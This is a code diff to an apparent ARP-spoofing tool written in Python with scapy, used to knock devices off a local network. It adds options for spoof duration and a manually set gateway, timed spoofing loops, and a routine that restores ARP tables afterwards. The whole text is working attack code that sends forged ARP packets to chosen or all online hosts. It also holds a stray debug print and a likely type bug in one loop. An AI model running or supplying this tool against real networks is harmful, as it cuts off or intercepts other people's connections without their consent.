@@ -27,7 +27,7 @@ def shutdown():
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
 try:
-    from scapy.config import conf  
+    from scapy.config import conf
     conf.ipv6_enabled = False
     from scapy.all import *
     import scan, spoof, nmap
@@ -184,6 +184,8 @@ def getDefaultInterfaceMAC():
 # retrieve gateway IP
 def getGatewayIP():
     global stopAnimation
+    if options.gateway:
+        return options.gateway
     try:
         getGateway, timeout = sr1(IP(dst="github.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False, timeout=4)
         if timeout:
@@ -333,8 +335,9 @@ def nonInteractiveAttack():
     else:
         print("\n{}Spoofing started... {}".format(GREEN, END))
     try:
-        while True:
-            # broadcast malicious ARP packets
+        print(f"selected time for spoof: {options.spoof_time}")
+        for i in range(0, int(options.spoof_time)):
+            print("spoofing...\n")
             for i in target:
                 ipAddress = i
                 macAddress = retrieveMACAddress(ipAddress)
@@ -342,10 +345,30 @@ def nonInteractiveAttack():
                     print("\n{}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{}".format(RED, END))
                     os._exit(1)
                 spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ipAddress, macAddress)
-            if options.packets is not None:
-                time.sleep(60/float(options.packets))
-            else:
-                time.sleep(10)
+            time.sleep(1)
+
+        # re-arp targets after spoofing
+        print("\n{}Re-arping{} target(s)...{}".format(RED, GREEN, END))
+        reArp = 1
+        while reArp != 10:
+            # broadcast ARP packets with legitimate info to restore connection
+            for i in target:
+                ipAddress = i
+                try:
+                    macAddress = retrieveMACAddress(ipAddress)
+                except:
+                    print("\n{}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{}".format(RED, END))
+                    os._exit(1)
+                try:
+                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ipAddress, macAddress)
+                except KeyboardInterrupt:
+                    pass
+                except:
+                    runDebug()
+            reArp += 1
+            time.sleep(0.2)
+        print("{}Re-arped{} target(s) successfully.{}".format(RED, GREEN, END))
+
     except KeyboardInterrupt:
         # re-arp targets on KeyboardInterrupt exception
         print("\n{}Re-arping{} target(s)...{}".format(RED, GREEN, END))
@@ -429,13 +452,16 @@ def kickoneoff():
     else:
         print("\n{}Spoofing started... {}".format(GREEN, END))
     try:
-        while True:
+        print(f"selected time for spoof: {options.spoof_time}")
+        for i in range(0, options.spoof_time):
             # broadcast malicious ARP packets
             spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
-            if options.packets is not None:
-                time.sleep(60/float(options.packets))
-            else:
-                time.sleep(10)
+            print("spoof junge\n")
+            time.sleep(1)
+            #if options.packets is not None:
+            #    time.sleep(60/float(options.packets))
+            #else:
+            #    time.sleep(10)
     except KeyboardInterrupt:
         # re-arp target on KeyboardInterrupt exception
         print("\n{}Re-arping{} target...{}".format(RED, GREEN, END))
@@ -578,7 +604,7 @@ def kickalloff():
             hostname = "N/A"
         vendor = resolveMac(mac)
         print("  [{}{}{}] {}{}{}\t{}{}\t{} ({}{}{}){}".format(YELLOW, str(i), WHITE, RED, str(onlineIPs[i]), BLUE, mac, GREEN, vendor, YELLOW, hostname, GREEN, END))
-    
+
     if options.packets is not None:
         print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
     else:
@@ -683,14 +709,14 @@ def main():
         t = threading.Thread(target=scanningAnimation, args=('Scanning your network, hang on...',))
         t.daemon = True
         t.start()
-    
+
         # commence scanning process
         try:
             scanNetwork()
         except KeyboardInterrupt:
             shutdown()
         stopAnimation = True
-    
+
         print("\nOnline IPs: ")
         for i in range(len(onlineIPs)):
             mac = ""
@@ -734,11 +760,16 @@ if __name__ == '__main__':
     parser.add_option('-a', '--kick-all', action='store_true', default=False,
                       dest='kick_all', help='perform attack on all online devices')
 
+    parser.add_option('-x', '--time', action='store', default=10, dest='spoof_time', help='time for spoof')
     def targetList(option, opt, value, parser):
         setattr(parser.values, option.dest, value.split(','))
     parser.add_option('-t', '--target', action='callback',
         callback=targetList, type='string',
         dest='targets', help='specify target IP address(es) and perform attack')
+
+    parser.add_option('-g', '--gateway', action='callback',
+        callback=(lambda option, opt, value, parser: setattr(parser.values, option.dest, value)), type='string',
+        dest='gateway', help='specify gateway IP address')
 
     (options, argv) = parser.parse_args()
 
